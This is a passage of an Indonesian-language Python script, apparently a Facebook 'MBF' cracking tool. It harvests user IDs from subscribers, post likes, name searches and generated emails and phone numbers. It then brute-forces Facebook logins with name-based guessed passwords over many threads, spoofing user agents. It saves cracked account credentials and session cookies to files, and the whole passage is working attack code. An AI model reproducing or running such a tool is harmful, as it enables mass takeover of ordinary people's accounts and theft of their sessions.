	akun = console.input(f' {H2}•{P2} masukan id target : ')
	try:
		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:
			    id.append(pi['id']+'|'+pi['name'])
			    sys.stdout.write(f"\r {H}•{P} mengumpulkan {H}{len(id)}{P} id...");sys.stdout.flush()
			    time.sleep(0.0002)
			except:continue
		print("\r")
		prints(Panel(f"{P2}berhasil mengumpulkan {color_rich}{len(id)}{P2} id",width=80,padding=(0,22),style=f"{color_table}"))
		setting()
	except requests.exceptions.ConnectionError:
		prints(f" {H2}•{P2} koneksi internet anda bermasalah")
		time.sleep(3);exit()
	except (KeyError,IOError):
		prints(f" {H2}•{P2} gagal dump id, kemungkinan akun private")
		time.sleep(3);exit()

###----------[ CRACK DARI EMAIL  ]---------- ###
def crackEmail():
	rc = random.choice
	rr = random.randint
	xc = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	prints(Panel(f'{P2}masukan nama email, contoh : andi, dian, putri, Nazri XD Ganteng Ngab max 5000 id',width=80,padding=(0,5),style=f"{color_table}"))
	nama = console.input(f' {H2}•{P2} masukan nama target : ')
	if ',' in str(nama):
		prints(f" {H2}•{P2} masukan nama, jangan kosong ngab")
		time.sleep(3);exit()
	prints(Panel(f'{P2}masukan nama domain, contoh : @gmail.com, @yahoo.com, dll',width=80,padding=(0,9),style=f"{color_table}"))
	doma = console.input(f' {H2}•{P2} masukan nama domain : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		prints(f" {H2}•{P2} masukan domain dengan benar")
		time.sleep(3);exit()
	jumlah = console.input(f' {H2}•{P2} total dump : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(xc))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(xc))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(xc))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in id:pass
		else:id.append(D+'|'+nama)
		if len(dump)==999999:setting()
		sys.stdout.write(f"\r {H}•{P} mengumpulkan {H}{len(id)}{P} id...");sys.stdout.flush()
		time.sleep(0.0000003)
	print("\r")
	setting()	

###----------[ CRACK DARI SEARCH NAME ]---------- ###
def dumpSearch():
	nama = []
	custom = [" muhammad"," firman"," pratama"," tyz"," galau"," semarang"," boyolali"," cilacap"," kebumen"," banyumas"," herex"," tuban"," sumedang"," aja"," new"," baru"," setia"," sayang"," cinta"," syank kamu"," cantik"," ganteng"," imut"," kalem"," sragen"," susah sembuh"," sudah sembuh"," sakit"," wae"," sulung"," nur"," dwi"," x gans"," x jebe"," x cogan"," x id"," ganong"," situbondo"," aremania"," sunda"," garut"," cirebon"," sukabumi"," medan"," thejack"," bobotoh"," bonek"," suroboyo"," surabaya"," persebaya"," persib"," persija"," cilacap"," jepara"," solo"," official"," manis"," imut"," kalem"," utama"," sukses"," real"," semok"," kesepian"," rentcar"," makmur"," jaya"," jr"," tasik"," malang"," jogja"," mama"," ibuknya"," bundanya"," tiktok"," kece"," keren"," baru"," jutek"," saja"," putri"," andi"," dewi"," tri"," dian"," sri"," putri"," eka"," sari"," aditya"," basuki"," budi"," joni"," toni"," bekti"," cahya"," harahap"," riski"," farhan"," aden"," joko"," firman"," sulis"," soleh"," gagal"," kacau"," sulis"," rahmat"," indah"," pribadi"," saputro"," saputra"," kediri"," kudus"," jember"," situbondo"," pemalang"," wonosobo"," trenggalek","  tuban"," gresik"," bangkalan"," jombang"," kediri"," lamongan"," lumajang"," madiun"," magetan"," mojokerto"," nganjuk"," pacitan"," ngawi"," pasuruan"," ponorogo"," pamengkasan"," sidoarjo"," tuban"," blitar"," kediri"," banjarnegara"," batang"," blora"," brebes"," grobokan"," karanganyar"," kendal"," klaten"," kudus"," pati"," pekalongan"," rembang"," sragen"," tegal"," temanggung"," wonogiri"," wonosobo"," sukoharjo"," salatiga"," bandung"," ciamis"," cianjur"," cirebon"," indramayu"," majalengka"," subang"," sumedang"," purwakarta"," banjar"," bekasi"," bogor"," comahi"," depok"," tasikmalaya "]
	custom2 = ["mamah ","ibuk ","bunda ","ayah ","om ","muhammad ","putra ","gagah ","namaku ","panggeran ","putri ","dewi ","joko ","sri ","dwi ","cinta ","sayang ","riski ","pesulap ","mamanya ","tante ","bu ","pakde ","juli ","emak "]
	prints(Panel(f"{P2}satu nama setara dengan {H2}10.000{P2} username",width=80,padding=(0,17),style=f"{color_table}"))
	nam = console.input(f' {H2}•{P2} masukan nama : ').split(",")
	for ser in nam:		
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=35) as thread:
		for id in nama:
			thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	setting()
		
def cari_nama(link):
	r = parser(ses.get(str(link)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in id:pass
			else:id.append(bo)
	link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
	if(link):
	  sys.stdout.write(f"\r {H}•{P} mengumpulkan {H}{len(id)}{P} id...");sys.stdout.flush()
	  time.sleep(0.0000003)
	cari_nama(link)

###----------[ CRACK NOMOR  ]---------- ###
def crackNomor():
	prints(Panel(f"{P2}crack dari nomor wajib menggunakan sandi manual or gabungan",width=80,padding=(0,7),style=f"{color_table}"))
	depan = console.input(f' {H2}•{P2} awalan nomor : ')
	if len(depan)==3:pass
	else:prints(f" {H2}•{P2} masukan awalan nomor dengan benar");exit()
	jumla = console.input(f' {H2}•{P2} jumlah dump : ')
	for x in range(int(jumla)):
		rr = random.randint
		A = depan
		B = rr(1111,9999)
		C = rr(1,9)
		D = f'{A}{C}-{str(rr(1111,9999))}-{str(B)}'
		if D in id:pass
		else:id.append(D+'|123456')
		sys.stdout.write(f"\r {H}•{P} mengumpulkan {H}{len(id)}{P} id...");sys.stdout.flush()
		time.sleep(0.0000003)
	print("\r")
	setting()		

###----------[ CRACK DARI FILES  ]---------- ###
def crackFile():
	prints(Panel(f"{P2}masukan nama file dump yang sudah tersedia di /sdcard/namafile.txt",width=80,padding=(0,5),style=f"{color_table}"))
	file = console.input(f' {H2}•{P2} masukan nama file : ')
	try:
		uuid = open(file,'r').readlines()
		for data in uuid:
			try:
			   user,nama = data.split('|')
			except:
			   prints(f" {H2}•{P2} pemisah salah")
			   time.sleep(3);exit()
			id.append(data)
			sys.stdout.write(f"\r {H}•{P} mengumpulkan {H}{len(id)}{P} id...");sys.stdout.flush()
			time.sleep(0.0000003)
	except FileNotFoundError:
	    prints(f" {H2}•{P2} file {H2}{file} {P2}tidak tersedia")
	    time.sleep(3);exit()
	print("\r")
	prints(Panel(f'\r{P2}total jumlah akun yang tersedia di dalam file {H2}{len(dump)}{reset}',width=80,padding=(0,13),style=f"{color_table}"))
	setting()

###----------[ DUMP LIKE ]---------- ###
def dumpLikes():
	try:
		token = open('data/tokenku.txt','r').read()
		cok = open('data/coki.txt','r').read()
	except IOError:
		exit()
	ses = requests.Session()
	prints(Panel(f"{P2}pastikan postingan memiliki like dan akun harus publik jangan private ",width=80,padding=(0,4),style=f"{color_table}"))
	pil = console.input(f' {H2}•{P2} masukan id postingan : ')
	try:
		koh2 = ses.get(f'https://graph.facebook.com/{pil}?fields=likes.limit(99999)&access_token={token}',cookies={'cookie': cok}).json()
		for pi in koh2['likes']['data']:
			try:
			    id.append(pi['id']+'|'+pi['name'])
			    sys.stdout.write(f"\r {H}•{P} mengumpulkan {H}{len(id)}{P} id...");sys.stdout.flush()
			    sys.stdout.flush()
			except:continue
		print('\r') 
		prints(Panel(f"{P2}berhasil mengumpulkan {color_rich}{len(id)}{P2} id",width=80,padding=(0,22),style=f"{color_table}"))
		setting()
	except requests.exceptions.ConnectionError:
		prints(f" {H2}•{P2} koneksi internet anda bermasalah")
		time.sleep(3);exit()
	except (KeyError,IOError):
		prints(f" {H2}•{P2} gagal dump id, kemungkinan akun private")
		time.sleep(3);exit()

###----------[ SETTING URUTAN ID & METODE ]---------- ###
def setting():
	urut = []
	urut.append(Panel(f'{P2}crack dari id old',width=25,padding=(0,2),title=f"{H2}01",style=f"{color_table}"))
	urut.append(Panel(f'{P2}crack dari id new',width=25,padding=(0,2),title=f"{H2}02",style=f"{color_table}"))
	urut.append(Panel(f'{P2}crack dari id random',width=27,padding=(0,2),title=f"{H2}03",style=f"{color_table}"))
	console.print(Columns(urut))
	hu = console.input(f" {H2}•{P2} crack dari id ? : ")
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		prints(f' {H2}•{P2} pilih yang bener')
		time.sleep(3);exit()
	urut = []
	urut.append(Panel(f'{P2}[{color_rich}01{P2}]. metode {color_rich}m.facebook.com\n{P2}[{color_rich}02{P2}]. metode {color_rich}free.facebook.com\n{P2}[{color_rich}03{P2}]. metode {color_rich}mbasic.facebook.com\n{P2}[{color_rich}04{P2}]. metode {color_rich}touch.facebook.com',width=39,padding=(0,1),title=f"{H2}metode validate",style=f"{color_table}"))
	urut.append(Panel(f'{P2}[{color_rich}05{P2}]. metode {color_rich}m.facebook.com\n{P2}[{color_rich}06{P2}]. metode {color_rich}free.facebook.com\n{P2}[{color_rich}07{P2}]. metode {color_rich}mbasic.facebook.com\n{P2}[{color_rich}08{P2}]. metode {color_rich}touch.facebook.com',width=39,padding=(0,1),title=f"{H2}metode regular",style=f"{color_table}"))
	console.print(Columns(urut))
	prints(Panel(f'{P2}[{color_rich}09{P2}]. metode {color_rich}b-api.facebook.com {H2}fast crack[white]\n{P2}[{color_rich}10{P2}]. metode {color_rich}b-api.facebook.com {H2}New V2',width=80,padding=(0,16),style=f"{color_table}"))
	hc = console.input(f" {H2}•{P2} pilih metode : ")
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('mbasic')
	elif hc in ['4','04']:
		method.append('touch')
	elif hc in ['5','05']:
		method.append('mobile-v2')
	elif hc in ['6','06']:
		method.append('free-v2')
	elif hc in ['7','07']:
		method.append('mbasic-v2')
	elif hc in ['8','08']:
		method.append('touch-v2')
	elif hc in ['9','09']:
		method.append('Api')
	elif hc in ['10']:
		method.append('metode_api')
	else:
		prints(f" {H2}•{P2} pilih metode dengan benar ")
		time.sleep(3);exit()
	prints(Panel(f"{P2}[{color_rich}01{P2}]. setting password otomatis \n{P2}[{color_rich}02{P2}]. setting password gabung\n{P2}[{color_rich}03{P2}]. setting password manual",title=f"{H2}setting password",width=80,padding=(0,20),style=f"{color_table}"))
	hc = console.input(f" {H2}•{P2} pilih password : ")
	if hc in ['']:
	  prints(f" {H2}•{P2} terjadi kesalahan ")
	  setting()
	elif hc in ['1','01']:
		otomatis()
	elif hc in ['2','02']:
		Tambahan()
	elif hc in ['3','03']:
		Manual()

###----------[ PASSWORD DEFAULT ]---------- ###
def otomatis():
	prints(Panel(f"{P2}[{color_rich}01{P2}]. crack menggunakan password nama\n{P2}[{color_rich}02{P2}]. crack menggunakan password nama+123\n{P2}[{color_rich}03{P2}]. crack menggunakan password nama+123+12345\n{P2}[{color_rich}04{P2}]. crack menggunakan password nama+123+1234+12345\n{P2}[{color_rich}05{P2}]. crack menggunakan password nama+123+1234+12345+123456\n{P2}[{color_rich}06{P2}]. crack menggunakan password nama+321+1234[/]",title=f"{H2}list password",width=80,padding=(0,8),style=f"{color_table}"))
	pwlis = console.input(f" {H2}•{P2} pilih password : ")
	pwlist.append(pwlis)
	ua = console.input(f" {H2}•{P2} ingin menggunakan useragent tambahan? (Y/t) : ")
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = console.input(f" {H2}•{P2} masukan useragent : ");uadia.append(bz)
		prints(Panel(f"{H2}{bz}{reset}",width=80,title=f"{H2}useragent",style=f"{color_table}"))
	if ua in ['t','T']:
		prints(Panel(f"{P2}saat ini anda menggunakan user agent bawaan dari script Facebook MBF",width=80,padding=(0,8),style=f"{color_table}"))
	else:uadarimu.append('uasc')
	urut = []
	urut.append(Panel(f'{P2}hasil {H2}{okc}',width=39,padding=(0,3),style=f"{color_table}"))
	urut.append(Panel(f'{P2}hasil {K2}{cpc}',width=39,padding=(0,3),style=f"{color_table}"))
	console.print(Columns(urut))
	prints(Panel(f"{P2}mainkan mode pesawat {color_rich}10 [white]detik jika tidak mendapatkan hasil sama sekali",width=80,padding=(0,3),style=f"{color_table}"))
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				if '1' in pwlist:
					pwv=[nmf]
				if '2' in pwlist:
					pwv=[nmf,frs+'123']
				if '3' in pwlist:
					pwv=[nmf,frs+'123',frs+'12345']
				if '4' in pwlist:
					pwv=[nmf,frs+'123',frs+'1234',frs+'12345']
				if '5' in pwlist:
					pwv=[nmf,frs+'123',frs+'1234',frs+'12345',frs+'123456']
				if '6' in pwlist:
					pwv=[nmf,frs+'321',frs+'1234']
				else:pass
				if 'mobile' in method:
					pool.submit(validate,idf,pwv,"m.facebook.com")
				elif 'free' in method:
					pool.submit(validate,idf,pwv,"free.facebook.com")
				elif 'mbasic' in method:
					pool.submit(validate,idf,pwv,"mbasic.facebook.com")
				elif 'touch' in method:
					pool.submit(validate,idf,pwv,"touch.facebook.com")
				elif 'mobile-v2' in method:
					pool.submit(regular,idf,pwv,"m.facebook.com")
				elif 'free-v2' in method:
					pool.submit(regular,idf,pwv,"free.facebook.com")
				elif 'mbasic-v2' in method:
					pool.submit(regular,idf,pwv,"mbasic.facebook.com")
				elif 'touch-v2' in method:
					pool.submit(regular,idf,pwv,"touch.facebook.com")
				elif 'Api' in method: 
					pool.submit(Api,idf,pwv)
				elif 'metode_api' in method: 
					pool.submit(metode_api,idf,pwv)
				else:
					pool.submit(metode_api,idf,pwv)
		prints(Panel(f'{P2}sukses cracked {H2}{len(id2)}[white] id, dengan jumlah hasil OK : {H2}{ok} {P2}CP : {K2}{cp}{reset}',width=80,padding=(0,8),style=f"{color_table}"))
		time.sleep(3);exit()

###----------[ PASSWORD GABUNG ]---------- ###
def Tambahan():
	prints(Panel(f"{P2}[{color_rich}01{P2}]. crack menggunakan password nama\n{P2}[{color_rich}02{P2}]. crack menggunakan password nama+123\n{P2}[{color_rich}03{P2}]. crack menggunakan password nama+123+12345\n{P2}[{color_rich}04{P2}]. crack menggunakan password nama+123+1234+12345\n{P2}[{color_rich}05{P2}]. crack menggunakan password nama+123+1234+12345+123456\n{P2}[{color_rich}06{P2}]. crack menggunakan password nama+321+1234[/]",title=f"{H2}list password",width=80,padding=(0,8),style=f"{color_table}"))
	pwlis = console.input(f" {H2}•{P2} pilih password : ")
	pwlist.append(pwlis)
	prints(Panel(f"{P2}gunakan tanda koma ({color_rich},{P2}) untuk pemisah password yang anda input{reset}",width=80,padding=(0,5),style=f"{color_table}"))
	pwku = console.input(f" {H2}•{P2} masukan password tambahan : ")
	pwkuh = pwku.split(',')
	for xpw in pwkuh:
		pwnya.append(xpw)
	ua = console.input(f" {H2}•{P2} ingin menggunakan useragent tambahan? (Y/t) : ")
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = console.input(f" {H2}•{P2} masukan useragent : ");uadia.append(bz)
		prints(Panel(f"{H2}{bz}{reset}",width=80,title=f"{H2}useragent",style=f"{color_table}"))
	if ua in ['t','T']:
		prints(Panel(f"{P2}saat ini anda menggunakan user agent bawaan dari script Facebook MBF",width=80,padding=(0,8),style=f"{color_table}"))
	else:uadarimu.append('uasc')
	urut = []
	urut.append(Panel(f'{P2}hasil {H2}{okc}',width=39,padding=(0,3),style=f"{color_table}"))
	urut.append(Panel(f'{P2}hasil {K2}{cpc}',width=39,padding=(0,3),style=f"{color_table}"))
	console.print(Columns(urut))
	prints(Panel(f"{P2}mainkan mode pesawat {color_rich}10 [white]detik jika tidak mendapatkan hasil sama sekali",width=80,padding=(0,3),style=f"{color_table}"))
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				if '1' in pwlist:
					pwv=[nmf]
				if '2' in pwlist:
					pwv=[nmf,frs+'123']
				if '3' in pwlist:
					pwv=[nmf,frs+'123',frs+'12345']
				if '4' in pwlist:
					pwv=[nmf,frs+'123',frs+'1234',frs+'12345']
				if '5' in pwlist:
					pwv=[nmf,frs+'123',frs+'1234',frs+'12345',frs+'123456']
				if '6' in pwlist:
					pwv=[nmf,frs+'321',frs+'1234']
				for xpwd in pwnya:
					pwv.append(xpwd)
				if 'mobile' in method:
					pool.submit(validate,idf,pwv,"m.facebook.com")
				elif 'free' in method:
					pool.submit(validate,idf,pwv,"free.facebook.com")
				elif 'mbasic' in method:
					pool.submit(validate,idf,pwv,"mbasic.facebook.com")
				elif 'touch' in method:
					pool.submit(validate,idf,pwv,"touch.facebook.com")
				elif 'mobile-v2' in method:
					pool.submit(regular,idf,pwv,"m.facebook.com")
				elif 'free-v2' in method:
					pool.submit(regular,idf,pwv,"free.facebook.com")
				elif 'mbasic-v2' in method:
					pool.submit(regular,idf,pwv,"mbasic.facebook.com")
				elif 'touch-v2' in method:
					pool.submit(regular,idf,pwv,"touch.facebook.com")
				elif 'Api' in method: 
					pool.submit(Api,idf,pwv)
				elif 'metode_api' in method: 
					pool.submit(metode_api,idf,pwv)
				else:
					pool.submit(metode_api,idf,pwv)
		prints(Panel(f'{P2}sukses cracked {H2}{len(id2)}[white] id, dengan jumlah hasil OK : {H2}{ok} {P2}CP : {K2}{cp}{reset}',width=80,padding=(0,8),style=f"{color_table}"))
		time.sleep(3);exit()

###----------[ PASSWORD MANUAL ]---------- ###
def Manual():
	prints(Panel(f"{P2}gunakan tanda koma ({color_rich},{P2}) untuk pemisah password yang anda input{reset}",width=80,padding=(0,5),style=f"{color_table}"))
	pwku = console.input(f" {H2}•{P2} masukan password tambahan : ")
	pwkuh = pwku.split(',')
	for xpw in pwkuh:
		pwnya.append(xpw)
	ua = console.input(f" {H2}•{P2} ingin menggunakan useragent tambahan? (Y/t) : ")
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = console.input(f" {H2}•{P2} masukan useragent : ");uadia.append(bz)
		prints(Panel(f"{H2}{bz}{reset}",width=80,title=f"{H2}useragent",style=f"{color_table}"))
	if ua in ['t','T','Tidak']:
		prints(Panel(f"{P2}saat ini anda menggunakan user agent bawaan dari script Facebook MBF",width=80,padding=(0,8),style=f"{color_table}"))
	else:uadarimu.append('uasc')
	urut = []
	urut.append(Panel(f'{P2}hasil {H2}{okc}',width=39,padding=(0,3),style=f"{color_table}"))
	urut.append(Panel(f'{P2}hasil {K2}{cpc}',width=39,padding=(0,3),style=f"{color_table}"))
	console.print(Columns(urut))
	prints(Panel(f"{P2}mainkan mode pesawat {color_rich}10 [white]detik jika tidak mendapatkan hasil sama sekali",width=80,padding=(0,3),style=f"{color_table}"))
	global prog,des
	prog = Progress(SpinnerColumn('earth'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				pwv = []
				for xpwd in pwnya:
					pwv.append(xpwd)
				if 'mobile' in method:
					pool.submit(validate,idf,pwv,"m.facebook.com")
				elif 'free' in method:
					pool.submit(validate,idf,pwv,"free.facebook.com")
				elif 'mbasic' in method:
					pool.submit(validate,idf,pwv,"mbasic.facebook.com")
				elif 'touch' in method:
					pool.submit(validate,idf,pwv,"touch.facebook.com")
				elif 'mobile-v2' in method:
					pool.submit(regular,idf,pwv)
				elif 'free-v2' in method:
					pool.submit(regular,idf,pwv,"free.facebook.com")
				elif 'mbasic-v2' in method:
					pool.submit(regular,idf,pwv,"mbasic.facebook.com")
				elif 'touch-v2' in method:
					pool.submit(regular,idf,pwv,"touch.facebook.com")
				elif 'Api' in method: 
					pool.submit(Api,idf,pwv)
				elif 'metode_api' in method: 
					pool.submit(metode_api,idf,pwv)
				else:
					pool.submit(metode_api,idf,pwv)
		prints(Panel(f'{P2}sukses cracked {H2}{len(id2)}[white] id, dengan jumlah hasil OK : {H2}{ok} {P2}CP : {K2}{cp}{reset}',width=80,padding=(0,8),style=f"{color_table}"))
		time.sleep(3);exit()

###----------[ CONVERT COOKIE ]---------- ###
def convert(cookie):
        coki2 = ('datr=%s;sb=%s;c_user=%s;xs=%s;fr=%s'%(cookie['datr'],cookie['sb'],cookie['c_user'],cookie['xs'],cookie['fr']))
        return(str(coki))

def ran():
    return str(tod()).split('.')[0]

###----------[ METODE VALIDATE ]---------- ###
def validate(idf,pwv,url):
	global loop,ok,cp
	prog.update(des,description=f"{H2}{url}{P2} {str(loop)}/{len(id2)} OK-:{H2}{ok}[/] CP-:{K2}{cp}[/]")
	prog.advance(des)
	ua = random.choice(uasm)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			p = ses.get(f"https://{url}/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr")
			data = {
			   "lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
			   "jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
			   "uid": idf,
			   "next": f"https://{url}/login/save-device/",
			   "flow": "login_no_pin",
			   "pass": pw}
			head = {
			   "cache-control": "max-age=0",
			   "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			   "sec-ch-ua": "'Chromium';v='107', 'Not=A?Brand';v='24'",
			   "sec-ch-ua-mobile": "?0",
			   "sec-ch-ua-platform": '"Linux"',
			   "sec-fetch-site": "none",
			   "sec-fetch-mode": "navigate",
			   "sec-fetch-user": "?1",
			   "sec-fetch-dest": "document",
			   "upgrade-insecure-requests": "1",
			   "user-agent": ua,
			   "accept-encoding": "gzip, deflate, br",
			   "accept-language": "id-ID,id;q=0.9"}
			po = ses.post(f"https://{url}/login/device-based/validate-password/?shbl=0", data=data, headers=head, allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict():
				tree = Tree("                                 ")
				tree.add(f"{K2}{idf}|{pw}")
				prints(tree)
				open('CP/'+cpc,'a').write("  * --> %s|%s\n"%(idf,pw))
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict():
				ok+=1
				coki = convert(ses.cookies.get_dict())
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree("                                 ")
				tree.add(f"{H2}{idf}|{pw}")
				tree.add(f"{H2}{kuki} | {ua}")
				prints(tree)
				open('OK/'+okc,'a').write("  * --> %s|%s|%s\n"%(idf,pw,kuki))
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

###----------[ METODE REGULAR ]---------- ###
def regular(idf,pwv,url):
	global loop,ok,cp
	ses = requests.Session()
	ua = random.choice(uasm)
	prog.update(des,description=f"{H2}{url}{P2} {str(loop)}/{len(id2)} OK-:{H2}{ok}[/] CP-:{K2}{cp}[/]")
	prog.advance(des)
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			ses.headers.update({'Host': url,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get(f'https://{url}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":f"https://{url}/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			head = {'Host': url,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': f'https://{url}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
